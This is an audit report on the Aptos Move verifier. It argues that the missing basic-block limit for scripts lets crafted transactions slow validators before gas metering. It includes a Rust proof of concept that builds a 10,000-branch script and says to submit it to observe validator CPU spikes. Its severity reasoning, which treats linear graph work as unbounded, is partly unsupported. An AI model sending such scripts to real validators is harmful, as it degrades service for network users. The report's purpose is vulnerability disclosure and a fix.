# Audit Report

## Title
Script Basic Block Limit Bypass Enables Validator DoS via Verification Exhaustion

## Summary
The Aptos production configuration sets `max_basic_blocks_in_script: None`, allowing scripts to contain an unlimited number of basic blocks (up to 65,535 due to u16 limits), while modules are restricted to 1,024 blocks. This enables attackers to submit malicious script transactions with excessive control flow branching that cause expensive CFG construction and verification operations on validator nodes, leading to transaction processing slowdowns before gas metering occurs.

## Finding Description
The Move bytecode verifier enforces a limit on basic blocks for modules but not for scripts in Aptos production: [1](#0-0) [2](#0-1) 

The verification code checks this limit during script validation: [3](#0-2) 

When `max_basic_blocks_in_script` is `None`, this check is skipped entirely, allowing scripts with thousands of basic blocks to proceed to expensive verification operations.

The control flow graph construction happens before gas metering: [4](#0-3) 

The CFG construction algorithm performs loop analysis with O(V + E) complexity where V is vertices (basic blocks) and E is edges: [5](#0-4) 

An attacker can craft a script with excessive branching (e.g., 10,000+ `BrTrue`/`BrFalse` instructions) to create tens of thousands of basic blocks. The transaction size limit (~6 MB) allows sufficient space for many branch instructions. This causes validators to spend significant CPU time constructing and analyzing the CFG during transaction validation, before any gas metering occurs.

**Attack Path:**
1. Attacker creates a script with 10,000+ branch instructions creating excessive basic blocks
2. Script passes mempool checks (transaction size, signature validation)
3. When consensus attempts to execute the transaction, validator calls `verify_script`
4. CFG construction in `VMControlFlowGraph::new()` processes all blocks synchronously
5. Loop analysis via `verify_reducibility()` traverses the large CFG
6. Multiple such transactions cause sustained validator slowdowns
7. Network throughput degrades as validators struggle with verification

## Impact Explanation
This is **HIGH SEVERITY** according to Aptos bug bounty criteria: "Validator node slowdowns" and "Significant protocol violations."

The vulnerability breaks the resource limits invariant (#9) by allowing computational complexity that should be bounded to occur before gas metering. While individual malicious scripts may eventually be rejected by meter limits during later verification stages, the upfront CFG construction and loop analysis are unbounded and synchronous operations that block the validation pipeline.

The impact includes:
- Validator nodes experience CPU exhaustion during transaction validation
- Transaction processing throughput reduction across the network
- Potential for sustained DoS if attackers submit multiple malicious scripts
- Degraded user experience as legitimate transactions queue behind expensive verifications

## Likelihood Explanation
**High likelihood** - The attack requires:
- Ability to submit script transactions (available to any user)
- Knowledge of bytecode branching instructions (publicly documented)
- No special privileges or validator access required

The attack is straightforward to execute and the vulnerability is present in the production configuration. The only limiting factor is transaction size constraints, but these still allow for thousands of basic blocks within the ~6 MB limit.

## Recommendation
Set `max_basic_blocks_in_script` to a reasonable limit consistent with module restrictions:

```rust
max_basic_blocks_in_script: Some(1024),
```

This matches the Move verifier's "production" configuration expectation and provides consistent protection across both modules and scripts. The limit should be enforced in `aptos_prod_verifier_config()`: [6](#0-5) 

Additionally, consider adding early bytecode complexity checks for scripts similar to the module publishing checks to catch pathological cases before CFG construction.

## Proof of Concept

```rust
// PoC: Create a script with excessive basic blocks
use move_binary_format::file_format::{
    Bytecode, CodeUnit, CompiledScript, FunctionHandle, 
    Signature, SignatureIndex, empty_script
};

fn create_malicious_script() -> CompiledScript {
    let mut script = empty_script();
    let mut code = vec![];
    
    // Create 10,000+ basic blocks through excessive branching
    // Each BrTrue creates 2 blocks (target + fallthrough)
    for _ in 0..10000 {
        code.push(Bytecode::LdTrue);
        code.push(Bytecode::BrTrue(0)); // Always branch to start
    }
    code.push(Bytecode::Ret);
    
    script.code = CodeUnit {
        locals: SignatureIndex(0),
        code,
    };
    
    script
}

// When verified with production config, this script:
// 1. Passes the basic block check (limit is None)
// 2. Causes expensive CFG construction (10,000+ blocks)
// 3. Triggers slow loop analysis in verify_reducibility
// 4. May eventually hit meter limits, but damage is already done
```

To test: Submit this script as a transaction payload and observe validator CPU usage spike during verification, before gas metering can limit the operation.

### Citations

**File:** aptos-move/aptos-vm-environment/src/prod_configs.rs (L145-194)
```rust
pub fn aptos_prod_verifier_config(gas_feature_version: u64, features: &Features) -> VerifierConfig {
    let sig_checker_v2_fix_script_ty_param_count =
        features.is_enabled(FeatureFlag::SIGNATURE_CHECKER_V2_SCRIPT_FIX);
    let sig_checker_v2_fix_function_signatures = gas_feature_version >= RELEASE_V1_34;
    let enable_enum_types = features.is_enabled(FeatureFlag::ENABLE_ENUM_TYPES);
    let enable_resource_access_control =
        features.is_enabled(FeatureFlag::ENABLE_RESOURCE_ACCESS_CONTROL);
    let enable_function_values = features.is_enabled(FeatureFlag::ENABLE_FUNCTION_VALUES);
    // Note: we reuse the `enable_function_values` flag to set various stricter limits on types.

    VerifierConfig {
        scope: VerificationScope::Everything,
        max_loop_depth: Some(5),
        max_generic_instantiation_length: Some(32),
        max_function_parameters: Some(128),
        max_basic_blocks: Some(1024),
        max_value_stack_size: 1024,
        max_type_nodes: if enable_function_values {
            Some(128)
        } else {
            Some(256)
        },
        max_push_size: Some(10000),
        max_struct_definitions: None,
        max_struct_variants: None,
        max_fields_in_struct: None,
        max_function_definitions: None,
        max_back_edges_per_function: None,
        max_back_edges_per_module: None,
        max_basic_blocks_in_script: None,
        max_per_fun_meter_units: Some(1000 * 80000),
        max_per_mod_meter_units: Some(1000 * 80000),
        _use_signature_checker_v2: true,
        sig_checker_v2_fix_script_ty_param_count,
        sig_checker_v2_fix_function_signatures,
        enable_enum_types,
        enable_resource_access_control,
        enable_function_values,
        max_function_return_values: if enable_function_values {
            Some(128)
        } else {
            None
        },
        max_type_depth: if enable_function_values {
            Some(20)
        } else {
            None
        },
    }
}
```

**File:** third_party/move/move-bytecode-verifier/src/code_unit_verifier.rs (L95-99)
```rust
        if let Some(limit) = verifier_config.max_basic_blocks_in_script {
            if function_view.cfg().blocks().len() > limit {
                return Err(PartialVMError::new(StatusCode::TOO_MANY_BASIC_BLOCKS));
            }
        }
```

**File:** third_party/move/move-bytecode-verifier/src/control_flow.rs (L58-70)
```rust
pub fn verify_script<'a>(
    verifier_config: &'a VerifierConfig,
    script: &'a CompiledScript,
) -> PartialVMResult<FunctionView<'a>> {
    if script.version() <= 5 {
        control_flow_v5::verify(verifier_config, None, &script.code)?;
        Ok(FunctionView::script(script))
    } else {
        verify_fallthrough(None, &script.code)?;
        let function_view = FunctionView::script(script);
        verify_reducibility(verifier_config, &function_view)?;
        Ok(function_view)
    }
```

**File:** third_party/move/move-binary-format/src/control_flow_graph.rs (L84-112)
```rust
    pub fn new(code: &[Bytecode]) -> Self {
        let code_len = code.len() as CodeOffset;
        // First go through and collect block ids, i.e., offsets that begin basic blocks.
        // Need to do this first in order to handle backwards edges.
        let mut block_ids = Set::new();
        block_ids.insert(ENTRY_BLOCK_ID);
        for pc in 0..code.len() {
            VMControlFlowGraph::record_block_ids(pc as CodeOffset, code, &mut block_ids);
        }

        // Create basic blocks
        let mut blocks = Map::new();
        let mut entry = 0;
        let mut exit_to_entry = Map::new();
        for pc in 0..code.len() {
            let co_pc = pc as CodeOffset;

            // Create a basic block
            if Self::is_end_of_block(co_pc, code, &block_ids) {
                let exit = co_pc;
                exit_to_entry.insert(exit, entry);
                let successors = Bytecode::get_successors(co_pc, code);
                let bb = BasicBlock { exit, successors };
                blocks.insert(entry, bb);
                entry = co_pc + 1;
            }
        }
        let blocks = blocks;
        assert_eq!(entry, code_len);
```
